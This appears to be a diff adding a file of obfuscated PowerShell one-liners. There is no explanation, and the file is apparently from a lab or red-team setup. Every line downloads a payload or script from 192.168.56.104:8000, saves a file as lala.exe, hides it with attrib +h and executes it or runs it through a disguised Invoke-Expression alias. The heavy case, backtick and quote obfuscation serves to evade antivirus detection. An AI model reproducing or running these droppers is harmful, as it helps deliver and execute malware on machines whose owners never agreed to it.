@@ -1,0 +1,15 @@
+fu""NcT""ioN hOjAbe{$s='gi-ekjf-xsld';s`E""T-aLI""a`s $s($s[$true-12]+($s[[byte]('0x'+'FF')-264]) + ($s[[byte]('0x'+'9a')-158]));gi-ekjf-xsld (N`e""W-O""b`jECt N`eT.WEbC`liENt).DoWNlOAdStRIng('ht'+'tp://'+'192.168.56.104:8000/stringpl.htm');}hOjAbe
+
+
+\"iEX (N`e""W-O""b`jECt N`eT.WEbC`liENt).DoWNl""OAdfI""Le('ht'+'tp://'+'192.168.56.104:8000/senpym""al','lala.exe');at`TRiB +h la"la.ex"e;i"I" la"la.ex"e;\"
+
+
+i"W"r ('ht'+'tp://'+'192.168.56.104:8000/sen"pym"al') -UsEBasICParsINg -Ou"tFi"LE la"la.ex"e;at`TRiB +h la"la.ex"e;Sta"RT-"pR"oce"SS la"la.ex"e;
+
+---------------------------
+From windows:
+
+$s='gi-ekjf-xsld';s`E""T-aLI""a`s $s($s[$true-12]+($s[[byte]('0x'+'FF')-264]) + ($s[[byte]('0x'+'9a')-158]));gi-ekjf-xsld "i`""W""`r ('ht'+'tp://'+'192.168.5'+'6.104:80'+'00/se'+'npymal') -UsEBasICParsINg -OuTFiLE la""la.ex""e";at`TRiB +h la""la.ex""e;i""I"" la""la.ex""e;
+
+iex "(N`e""W-O""b`jECt N`eT.WEbC`liENt).DoWNlOAdfILe('ht'+'tp://'+'192.168.56.104:8000/senpymal','lala.exe')";at`T"Ri"B +h la"la.ex"e;i""I"" la"la.ex"e;
+
